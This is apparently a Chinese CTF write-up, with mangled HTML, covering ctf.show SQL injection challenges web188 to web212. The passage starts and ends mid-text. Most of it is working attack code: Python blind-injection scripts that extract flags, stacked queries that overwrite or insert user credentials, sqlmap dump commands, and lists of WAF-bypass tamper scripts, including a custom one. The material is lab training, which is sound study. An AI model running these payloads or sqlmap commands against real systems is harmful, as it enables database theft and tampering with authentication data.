以字母为开头的字符型数据在与数字型比较时，会强制转化为<span class="hljs-number">0</span>，再与数字比较（这里很类似于PHP的弱比较）<br>  假设我们username为<span class="hljs-number">0</span>，那么就会相等，从而匹配成功<br><br>  在这里的<span class="hljs-keyword">password</span>是用<span class="hljs-number">0</span>来混字母开头的$<span class="hljs-keyword">row</span>[<span class="hljs-string">&#x27;pass&#x27;</span>]<br><br>- ```python<br>  <span class="hljs-keyword">import</span> requests<br>  <br>  url = <span class="hljs-string">&#x27;http://389becec-663f-4c9e-b136-296f96d0f800.challenge.ctf.show/api/&#x27;</span><br>  <br>  payload = &#123;<br>      &quot;username&quot;:&quot;0&quot;,<br>      &quot;password&quot;:&quot;0&quot;<br>  &#125;<br>  <br>  res = requests.post(url=url,data=payload).text<br>  <br>  print(res)<br></code></pre></td></tr></table></figure></li>
+</ul>
+<h3 id="web189"><a href="#web189" class="headerlink" title="web189"></a>web189</h3><ul>
+<li><p>提示说flag在api&#x2F;index.php文件中</p>
+</li>
+<li><p>先使用上题的0做弱比较，返回密码错误</p>
+</li>
+<li><p>如果是username是1的话，返回查询失败</p>
+</li>
+<li><p>所以是一道盲注</p>
+</li>
+<li><p>&#96;&#96;&#96;python<br>import requests<br>import sys<br>import json</p>
+<p>url &#x3D; ‘<a target="_blank" rel="noopener" href="http://72cbb7d0-93df-430b-b27f-410bc881ed88.challenge.ctf.show/api/index.php&#39;">http://72cbb7d0-93df-430b-b27f-410bc881ed88.challenge.ctf.show/api/index.php&#39;</a><br>flag &#x3D; ‘ctfshow{‘<br>letter &#x3D; ‘0123456789abcdefghijklmnopqrstuvwxyz-{}’</p>
+<p>for i in range(100):<br>for j in letter:<br>    payload &#x3D; {<br>        “username”: “if(load_file(‘&#x2F;var&#x2F;www&#x2F;html&#x2F;api&#x2F;index.php’)regexp(‘{}’),0,1)”.format(flag + j),<br>        “password”: “0”<br><br>    }<br>    r &#x3D; requests.post(url&#x3D;url,data&#x3D;payload)<br>    #print(r)<br>    if “\u5bc6\u7801\u9519\u8bef” &#x3D;&#x3D; r.json()[‘msg’]:<br>        flag +&#x3D; j<br>        print(flag)<br>        break<br>    if ‘}’ in flag:<br>        sys.exit()</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><code class="hljs bash"><br><span class="hljs-comment">### web190</span><br><br>- ```python<br>  import requests<br>  <br>  url = <span class="hljs-string">&#x27;http://a5078e0a-b91b-4b66-b17d-e4ca982ee54e.challenge.ctf.show/api/&#x27;</span><br>  flag = <span class="hljs-string">&quot;&quot;</span><br>  i = 0<br>  <br>  <span class="hljs-keyword">while</span> True:<br>      i = i + 1<br>      <span class="hljs-built_in">head</span> = 32<br>      <span class="hljs-built_in">tail</span> = 127<br>  <br>      <span class="hljs-keyword">while</span> <span class="hljs-built_in">head</span> &lt; <span class="hljs-built_in">tail</span>:<br>          mid = (<span class="hljs-built_in">head</span> + <span class="hljs-built_in">tail</span>) &gt;&gt; 1<br>          <span class="hljs-comment"># 查数据库</span><br>          <span class="hljs-comment"># payload = &quot;database()&quot;</span><br>          <span class="hljs-comment"># 查表</span><br>          <span class="hljs-comment"># payload = &quot;select group_concat(table_name) from information_schema.tables where table_schema=database()&quot;</span><br>          <span class="hljs-comment"># 查字段</span><br>          <span class="hljs-comment"># payload = &quot;select group_concat(column_name) from information_schema.columns where table_name=&#x27;ctfshow_fl0g&#x27;&quot;</span><br>          <span class="hljs-comment"># 查flag</span><br>          payload = <span class="hljs-string">&quot;select group_concat(f1ag) from ctfshow_fl0g&quot;</span><br>          data = &#123;<br>              <span class="hljs-string">&#x27;username&#x27;</span>: f<span class="hljs-string">&quot;admin&#x27; and if(ascii(substr((&#123;payload&#125;),&#123;i&#125;,1))&gt;&#123;mid&#125;,1,0)=&#x27;1&quot;</span>,<br>              <span class="hljs-string">&#x27;password&#x27;</span>: <span class="hljs-string">&#x27;1&#x27;</span><br>          &#125;<br>  <br>          r = requests.post(url=url,data=data)<br>          <span class="hljs-keyword">if</span> <span class="hljs-string">&quot;\u5bc6\u7801\u9519\u8bef&quot;</span>  == r.json()[<span class="hljs-string">&#x27;msg&#x27;</span>]:<br>              <span class="hljs-built_in">head</span> = mid + 1<br>          <span class="hljs-keyword">else</span>:<br>              <span class="hljs-built_in">tail</span> = mid<br>  <br>      <span class="hljs-keyword">if</span> <span class="hljs-built_in">head</span> != 32:<br>          flag += chr(<span class="hljs-built_in">head</span>)<br>      <span class="hljs-keyword">else</span>:<br>          <span class="hljs-built_in">break</span><br>      <span class="hljs-built_in">print</span>(flag)<br>  <br></code></pre></td></tr></table></figure></li>
+</ul>
+<h3 id="web191"><a href="#web191" class="headerlink" title="web191"></a>web191</h3><ul>
+<li>过滤了ascii</li>
+<li>把190的脚本中的ascii换成ord</li>
+<li>ord函数是返回字符串第一个字符的ascii值</li>
+</ul>
+<h3 id="web192"><a href="#web192" class="headerlink" title="web192"></a>web192</h3><ul>
+<li><p>在上一题的基础上又屏蔽了ord</p>
+</li>
+<li><p>把flagstr上套ascii</p>
+</li>
+<li><p>&#96;&#96;&#96;python<br>import requests<br>import string</p>
+<p>url &#x3D; “<a target="_blank" rel="noopener" href="http://080d608d-53e2-4243-ac9a-2879a3991bbb.challenge.ctf.show/api/&quot;">http://080d608d-53e2-4243-ac9a-2879a3991bbb.challenge.ctf.show/api/&quot;</a><br>flagstr&#x3D;” _{}-“ + string.ascii_lowercase + string.digits<br>flag &#x3D; ‘’<br>for i in range(1,45):<br>for j in flagstr:<br>    payload &#x3D; f”admin’ and if(substr((select group_concat(f1ag) from ctfshow_fl0g),{i},1)regexp(‘{j}’),1,2)&#x3D;’1”<br>    data &#x3D; {<br>        ‘username’: payload,<br>        ‘password’: ‘1’<br>    }<br>    r &#x3D; requests.post(url, data&#x3D;data)<br>    if “密码错误” &#x3D;&#x3D; r.json()[‘msg’]:<br>        flag +&#x3D; j<br>        print(flag)<br>        if “}” &#x3D;&#x3D; j:<br>            exit(0)<br>        break</p>
+<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs awk"><br><span class="hljs-comment">### web193</span><br><br>- 禁用了substr<br><br>- ```python<br>  import requests<br>  import sys<br>  url = <span class="hljs-string">&#x27;http://955bf0a2-3516-4e57-9534-f5029f4ada04.challenge.ctf.show:8080/api/&#x27;</span><br>  flag = <span class="hljs-string">&#x27;ctfshow&#123;&#x27;</span><br>  letter = <span class="hljs-string">&#x27;0123456789abcdefghijklmnopqrstuvwxyz-_,&#123;&#125;&#x27;</span><br>  <br>  <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> range(<span class="hljs-number">100</span>):<br>      <span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> letter:<br>          payload = <span class="hljs-string">&quot;&#x27; or if((select group_concat(f1ag) from ctfshow_flxg) like &#x27;&#123;&#125;&#x27;,1,0) =&#x27;1&quot;</span>.format(flag+j+<span class="hljs-string">&quot;%&quot;</span>)<br>          data=&#123;<br>              <span class="hljs-string">&#x27;username&#x27;</span>:payload,<br>              <span class="hljs-string">&#x27;password&#x27;</span>:<span class="hljs-number">1</span><br>          &#125;<br>          res = requests.post(url=url,data=data)<br>          <span class="hljs-keyword">if</span> <span class="hljs-string">&quot;密码错误&quot;</span> == res.json()[<span class="hljs-string">&#x27;msg&#x27;</span>]:<br>              flag += j<br>              print(flag)<br>              <span class="hljs-keyword">break</span><br>          <span class="hljs-keyword">if</span> <span class="hljs-string">&quot;&#125;&quot;</span> <span class="hljs-keyword">in</span> flag:<br>              sys.<span class="hljs-keyword">exit</span>()<br>  <br></code></pre></td></tr></table></figure></li>
+</ul>
+<h3 id="web194"><a href="#web194" class="headerlink" title="web194"></a>web194</h3><ul>
+<li><p>web193的立刻依旧可以打</p>
+</li>
+<li><p>来点新姿势</p>
+</li>
+<li><p><code>LOCATE(substr,string)</code><br>返回字符串<code>string</code>中<strong>第一次</strong>出现子字符串的位置 <code>subtr</code>，从1开始计数<br>例如：SELECT LOCATE(‘2’, ‘123’) 返回 2</p>
+</li>
+<li><p>&#96;&#96;&#96;python<br>import requests</p>
+</li>
+</ul>
+<h1 id="应该还可以用instr等函数，LOCATE、POSITION、INSTR、FIND-IN-SET、IN、LIKE"><a href="#应该还可以用instr等函数，LOCATE、POSITION、INSTR、FIND-IN-SET、IN、LIKE" class="headerlink" title="应该还可以用instr等函数，LOCATE、POSITION、INSTR、FIND_IN_SET、IN、LIKE"></a>应该还可以用instr等函数，LOCATE、POSITION、INSTR、FIND_IN_SET、IN、LIKE</h1><p>  url &#x3D; “<a target="_blank" rel="noopener" href="http://dee436de-268a-408e-b66a-88b4c972e5f5.chall.ctf.show/api/&quot;">http://dee436de-268a-408e-b66a-88b4c972e5f5.chall.ctf.show/api/&quot;</a><br>  final &#x3D; “”<br>  stttr &#x3D; “flag{}-_1234567890qwertyuiopsdhjkzxcvbnm”<br>  for i in range(1,45):<br>      for j in stttr:<br>          final +&#x3D; j<br>          # 查表名-ctfshow_flxg<br>          # payload &#x3D; f”admin’ and if(locate(‘{final}’,(select table_name from information_schema.tables where table_schema&#x3D;database() limit 0,1))&#x3D;1,1,2)&#x3D;’1”<br>          # 查字段-f1ag<br>          # payload &#x3D; f”admin’ and if(locate(‘{final}’,(select column_name from information_schema.columns where table_name&#x3D;’ctfshow_flxg’ limit 1,1))&#x3D;1,1,2)&#x3D;’1”<br>          payload &#x3D; f”admin’ and if(locate(‘{final}’,(select f1ag from ctfshow_flxg limit 0,1))&#x3D;1,1,2)&#x3D;’1”<br>          data &#x3D; {<br>              ‘username’: payload,<br>              ‘password’: ‘1’<br>          }<br>          r &#x3D; requests.post(url,data&#x3D;data)<br>          if “密码错误” &#x3D;&#x3D; r.json()[‘msg’]:<br>              print(final)<br>          else:<br>              final &#x3D; final[:-1]<br>  <figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs markdown"><br><span class="hljs-section">### web195</span><br><br><span class="hljs-bullet">-</span> 题目中看到过滤了select<br><br><span class="hljs-bullet">-</span> 提示使用update<br><br><span class="hljs-bullet">-</span> 那么在用户名一栏输入<br><br></code></pre></td></tr></table></figure><br>  0;update<code>ctfshow_user</code>set<code>pass</code>&#x3D;(1)<br>  <figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs markdown"><br>  相当于修改密码<br><br><span class="hljs-bullet">-</span> 然后0 1登录成功<br><br><span class="hljs-section">### web196</span><br><br><span class="hljs-bullet">-</span> 关键之处：<span class="hljs-code">`$row[0]==$password`</span><br><span class="hljs-bullet">-</span> 用户名：1;select(1);l<br><span class="hljs-bullet">-</span> 密码：1<br><br><span class="hljs-section">### web197</span><br><br><span class="hljs-bullet">-</span> 过滤了update<br><br><span class="hljs-bullet">-</span> 使用insert<br><br><span class="hljs-bullet">-</span> 那么在用户名一栏输入<br><br></code></pre></td></tr></table></figure><br>  0;<code>ctfshow_user</code>value(123,123,123)<br>  <figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs routeros"><br>- 再用户名密码123 123登录<br><br><span class="hljs-comment">### web198</span><br><br>- 同197<br><br><span class="hljs-comment">### web199～200</span><br><br>- 用户名：0;show tables;<br>- 密码：ctfshow_user<br><br><span class="hljs-comment">### web201</span><br><br>- sqlmap<br><br>- ```<br>  sqlmap -u <span class="hljs-string">&quot;http://8e663fa9-ca2c-4173-b948-6761f3e6c2e6.challenge.ctf.show/api/?id=&quot;</span>  <span class="hljs-attribute">--user-agent</span>=sqlmap <span class="hljs-attribute">--referer</span>=ctf.show --dbs<br>  <br>  sqlmap -u <span class="hljs-string">&quot;http://8e663fa9-ca2c-4173-b948-6761f3e6c2e6.challenge.ctf.show/api/?id=&quot;</span>  <span class="hljs-attribute">--user-agent</span>=sqlmap <span class="hljs-attribute">--referer</span>=ctf.show -D ctfshow_web --tables<br>  <br>  sqlmap -u <span class="hljs-string">&quot;http://8e663fa9-ca2c-4173-b948-6761f3e6c2e6.challenge.ctf.show/api/?id=&quot;</span>  <span class="hljs-attribute">--user-agent</span>=sqlmap <span class="hljs-attribute">--referer</span>=ctf.show -D ctfshow_web -T ctfshow_user --columns<br>  <br>  sqlmap -u <span class="hljs-string">&quot;http://8e663fa9-ca2c-4173-b948-6761f3e6c2e6.challenge.ctf.show/api/?id=&quot;</span>  <span class="hljs-attribute">--user-agent</span>=sqlmap <span class="hljs-attribute">--referer</span>=ctf.show -D ctfshow_web -T ctfshow_user --dump<br>  <br></code></pre></td></tr></table></figure></p>
+<h3 id="web202"><a href="#web202" class="headerlink" title="web202"></a>web202</h3><ul>
+<li><p>使用–data调整sqlmap的请求方式</p>
+</li>
+<li><p>&#96;&#96;&#96;<br>sqlmap -u <a target="_blank" rel="noopener" href="http://fcef3bbc-e7a2-4ea3-8f41-cd3a93cfc00c.challenge.ctf.show/api/index.php">http://fcef3bbc-e7a2-4ea3-8f41-cd3a93cfc00c.challenge.ctf.show/api/index.php</a> –data “id&#x3D;1” –us<br>er-agent&#x3D;sqlmap –referer&#x3D;ctf.show -D ctfshow_web -T ctfshow_user –dump</p>
+<figure class="highlight maxima"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs maxima"><br>### web203<br><br>- --<span class="hljs-built_in">method</span>修改方法<br>- --header添加请求头<br><br>- ```<br>  sqlmap -u http://<span class="hljs-number">08d77122</span>-b80d-<span class="hljs-number">49b0</span>-85d5-42c346888722.challenge.ctf.<span class="hljs-built_in">show</span>/api/index.php --<span class="hljs-built_in">method</span>=<span class="hljs-built_in">put</span> --header=Content-Type:text/plain --data <span class="hljs-string">&quot;id=1&quot;</span> --user-agent=sqlmap --referer=ctf.<span class="hljs-built_in">show</span> -D ctfshow_web -T ctfshow_user --dump<br></code></pre></td></tr></table></figure></li>
+</ul>
+<h3 id="web204"><a href="#web204" class="headerlink" title="web204"></a>web204</h3><ul>
+<li><p>–cookie可以添加cookie</p>
+</li>
+<li><p>&#96;&#96;&#96;<br>sqlmap -u <a target="_blank" rel="noopener" href="http://961b7f7b-d646-4823-88b2-aceead519fe4.challenge.ctf.show/api/index.php">http://961b7f7b-d646-4823-88b2-aceead519fe4.challenge.ctf.show/api/index.php</a> –method&#x3D;put –header&#x3D;Content-Type:text&#x2F;plain cookie&#x3D;”PHPSESSID&#x3D;1koef7it9pk0fo0b62tk2888tb” –data “id&#x3D;1” –user-agent&#x3D;sqlmap –referer&#x3D;ctf.show -D ctfshow_web -T ctfshow_user –dump</p>
+<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs awk"><br><span class="hljs-comment">### web205</span><br><br>- 提示：api需要鉴权<br><br>- 通过抓包分析，在每次请求`url<span class="hljs-regexp">/api/i</span>ndex.php`之前需要先请求`URL<span class="hljs-regexp">/api/g</span>etTokn.php<br><br>- **--safe-url 设置在测试目标地址前访问的安全链接**<br>   **--safe-freq 设置两次注入测试前访问安全链接的次数**<br><br>- ```<br>  sqlmap -u http:<span class="hljs-regexp">//</span><span class="hljs-number">85</span>fe947b-<span class="hljs-number">518</span>c-<span class="hljs-number">450</span>c-<span class="hljs-number">8335</span>-ac69a6a59b78.chall.ctf.show<span class="hljs-regexp">/api/i</span>ndex.php --method=PUT --data=<span class="hljs-string">&quot;id=1&quot;</span> --referer=ctf.show --dbms=mysql dbs=ctfshow_web -T ctfshow_flax -C flagx --dump  --headers=<span class="hljs-string">&quot;Content-Type: text/plain&quot;</span> --safe-url=http:<span class="hljs-regexp">//</span><span class="hljs-number">85</span>fe947b-<span class="hljs-number">518</span>c-<span class="hljs-number">450</span>c-<span class="hljs-number">8335</span>-ac69a6a59b78.chall.ctf.show<span class="hljs-regexp">/api/g</span>etToken.php --safe-freq=<span class="hljs-number">1</span><br></code></pre></td></tr></table></figure></li>
+</ul>
+<h3 id="web206"><a href="#web206" class="headerlink" title="web206"></a>web206</h3><ul>
+<li><p>提示：sql需要闭合</p>
+</li>
+<li><pre><code class="hljs">sqlmap -u http://303329b7-8627-41d9-9e71-45a218a61c49.chall.ctf.show/api/index.php --method=PUT --data=&quot;id=1&quot; --referer=ctf.show --dbms=mysql -D &quot;ctfshow_web&quot; -T &quot;ctfshow_flaxc&quot; -C &quot;flagv&quot; --dump  --headers=&quot;Content-Type: text/plain&quot; --safe-url=http://303329b7-8627-41d9-9e71-45a218a61c49.chall.ctf.show/api/getToken.php --safe-freq=1
+<figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br></pre></td><td class="code"><pre><code class="hljs pgsql"><br>### web207<br><br>- tamper的编写https://y4er.com/post/sqlmap-tamper/<br><br>- 列一下sqlmap自带的tamper<br><br>- ```<br>  space2comment.py用<span class="hljs-comment">/**/</span>代替空格<br>   <br>  apostrophemask.py用utf8代替引号<br>   <br>  equaltolike.pylike代替等号<br>   <br>  space2dash.py　绕过过滤‘=’ 替换空格字符（”），（’–‘）后跟一个破折号注释，一个随机字符串和一个新行（’n’）<br>   <br>  greatest.py　绕过过滤’&gt;’ ,用GREATEST替换大于号。<br>   <br>  space2hash.py空格替换为#号,随机字符串以及换行符<br>   <br>  apostrophenullencode.py绕过过滤双引号，替换字符和双引号。<br>   <br>  halfversionedmorekeywords.py当数据库为mysql时绕过防火墙，每个关键字之前添加mysql版本评论<br>   <br>  space2morehash.py空格替换为 #号 以及更多随机字符串 换行符<br>   <br>  appendnullbyte.py在有效负荷结束位置加载零字节字符编码<br>   <br>  ifnull2ifisnull.py　绕过对IFNULL过滤,替换类似’IFNULL(A,B)’为’<span class="hljs-keyword">IF</span>(<span class="hljs-keyword">ISNULL</span>(A), B, A)’<br>   <br>  space2mssqlblank.py(mssql)空格替换为其它空符号<br>   <br>  base64encode.py　用base64编码替换<br>   <br>  space2mssqlhash.py　替换空格<br>   <br>  modsecurityversioned.py过滤空格，包含完整的查询版本注释<br>   <br>  space2mysqlblank.py　空格替换其它空白符号(mysql)<br>   <br>  <span class="hljs-keyword">between</span>.py用<span class="hljs-keyword">between</span>替换大于号（&gt;）<br>   <br>  space2mysqldash.py替换空格字符（”）（’ – ‘）后跟一个破折号注释一个新行（’ n’）<br>   <br>  multiplespaces.py围绕<span class="hljs-keyword">SQL</span>关键字添加多个空格<br>   <br>  space2plus.py用+替换空格<br>   <br>  bluecoat.py代替空格字符后与一个有效的随机空白字符的<span class="hljs-keyword">SQL</span>语句,然后替换=为<span class="hljs-keyword">like</span><br>   <br>  nonrecursivereplacement.py双重查询语句,取代<span class="hljs-keyword">SQL</span>关键字<br>   <br>  space2randomblank.py代替空格字符（“”）从一个随机的空白字符可选字符的有效集<br>   <br>  sp_password.py追加sp_password’从DBMS日志的自动模糊处理的有效载荷的末尾<br>   <br>  chardoubleencode.py双url编码(不处理以编码的)<br>   <br>  unionalltounion.py替换<span class="hljs-keyword">UNION</span> ALLSELECT <span class="hljs-keyword">UNION</span> <span class="hljs-keyword">SELECT</span><br>   <br>  charencode.py　url编码<br>   <br>  randomcase.py随机大小写<br>   <br>  unmagicquotes.py宽字符绕过 GPCaddslashes<br>   <br>  randomcomments.py用<span class="hljs-comment">/**/</span>分割<span class="hljs-keyword">sql</span>关键字<br>   <br>  charunicodeencode.py字符串 unicode 编码<br>   <br>  securesphere.py追加特制的字符串<br>   <br>  versionedmorekeywords.py注释绕过<br>   <br>  space2comment.py替换空格字符串(‘‘) 使用注释‘<span class="hljs-comment">/**/</span>’<br>   <br>  halfversionedmorekeywords.py关键字前加注释<br></code></pre></td></tr></table></figure>
+</code></pre>
+</li>
+<li><p>开始分析这题，首先它过滤了空格</p>
+</li>
+<li><p>选择space2</p>
+</li>
+<li><p>&#96;&#96;&#96;<br>sqlmap -u “<a target="_blank" rel="noopener" href="http://22a17c53-2712-4184-ab0c-e9548c21fff0.challenge.ctf.show/api/index.php&quot;">http://22a17c53-2712-4184-ab0c-e9548c21fff0.challenge.ctf.show/api/index.php&quot;</a> –user-agent&#x3D;sqlmap –method&#x3D;PUT –data “id&#x3D;1” –referer&#x3D;ctf.show –headers&#x3D;Content-Type:text&#x2F;plain –cookie&#x3D;”PHPSESSID&#x3D;0s10857oppg126l47tnkfvgdnt” –safe-url&#x3D;”<a target="_blank" rel="noopener" href="http://22a17c53-2712-4184-ab0c-e9548c21fff0.challenge.ctf.show/api/getToken.php&quot;">http://22a17c53-2712-4184-ab0c-e9548c21fff0.challenge.ctf.show/api/getToken.php&quot;</a> –safe-freq&#x3D;1 –tamper&#x3D;space2comment -D ctfshow_web -T ctfshow_flaxca –dump</p>
+<figure class="highlight jboss-cli"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs jboss-cli"><br><span class="hljs-comment">### web208</span><br><br>- 过滤了select<br>- 可以随机大小写绕过（randomcase.py）,多个tamper用`,`分隔<br><br>- ```<br>  sqlmap -u http:<span class="hljs-string">//9cd7a826-e21c-4097-8d19-a2f8ecba5406.challenge.ctf.show/api/index.php</span> <span class="hljs-params">--safe-url=http</span>:<span class="hljs-string">//9cd7a826-e21c-4097-8d19-a2f8ecba5406.challenge.ctf.show/api/getToken.php</span> <span class="hljs-params">--safe-freq=1</span> -method=PUT <span class="hljs-params">--headers=</span><span class="hljs-string">&quot;Content-Type: text/plain&quot;</span> <span class="hljs-params">--data=</span><span class="hljs-string">&quot;id=1&quot;</span> <span class="hljs-params">--dbms=mysql</span> <span class="hljs-params">--current-db</span> <span class="hljs-params">--tables</span>  -T ctfshow_flaxcac  <span class="hljs-params">--dump</span>  <span class="hljs-params">--level=3</span> <span class="hljs-params">--tamper=</span><span class="hljs-string">&quot;space2comment,randomcase&quot;</span><br></code></pre></td></tr></table></figure></li>
+</ul>
+<h3 id="web209"><a href="#web209" class="headerlink" title="web209"></a>web209</h3><ul>
+<li><p>过滤了&#x3D;和*</p>
+</li>
+<li><p>自定义一个tamper文件（文件名为ctfshow209）放到tamper目录里</p>
+</li>
+<li><p>&#96;&#96;&#96;python<br>#!&#x2F;usr&#x2F;bin&#x2F;env python</p>
+<p>from lib.core.compat import xrange<br>from lib.core.enums import PRIORITY</p>
+<p><strong>priority</strong> &#x3D; PRIORITY.LOW</p>
+<p>def dependencies():<br>pass<br>def tamper(payload, **kwargs):</p>
+<pre><code class="hljs">retVal = payload
+retVal = retVal.replace(&quot;=&quot;, &quot; like &quot;)
+retVal = retVal.replace(&quot; &quot;, chr(0x0a))
+
+
+return retVal
+</code></pre>
+<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs routeros"><br>  <br><br>- ```<br>  sqlmap -u <span class="hljs-string">&quot;http://2e264752-738d-4f96-bfc1-22cc9ef6f354.challenge.ctf.show/api/index.php&quot;</span> <span class="hljs-attribute">--user-agent</span>=sqlmap <span class="hljs-attribute">--method</span>=PUT --data <span class="hljs-string">&quot;id=1&quot;</span> <span class="hljs-attribute">--referer</span>=ctf.show <span class="hljs-attribute">--headers</span>=Content-Type:text/plain <span class="hljs-attribute">--cookie</span>=<span class="hljs-string">&quot;PHPSESSID=l6jirkfhuubl7tfv95ah7p9ijv&quot;</span> <span class="hljs-attribute">--safe-url</span>=<span class="hljs-string">&quot;http://2e264752-738d-4f96-bfc1-22cc9ef6f354.challenge.ctf.show/api/getToken.php&quot;</span> <span class="hljs-attribute">--safe-freq</span>=1 <span class="hljs-attribute">--tamper</span>=ctfshow209 -D ctfshow_web -T ctfshow_flav --dump<br></code></pre></td></tr></table></figure></li>
+</ul>
+<h3 id="web210～212"><a href="#web210～212" class="headerlink" title="web210～212"></a>web210～212</h3><ul>
+<li><p>&#96;&#96;&#96;python<br>from lib.core.compat import xrange<br>from lib.core.enums import PRIORITY<br>import base64<br><strong>priority</strong> &#x3D; PRIORITY.LOW</p>
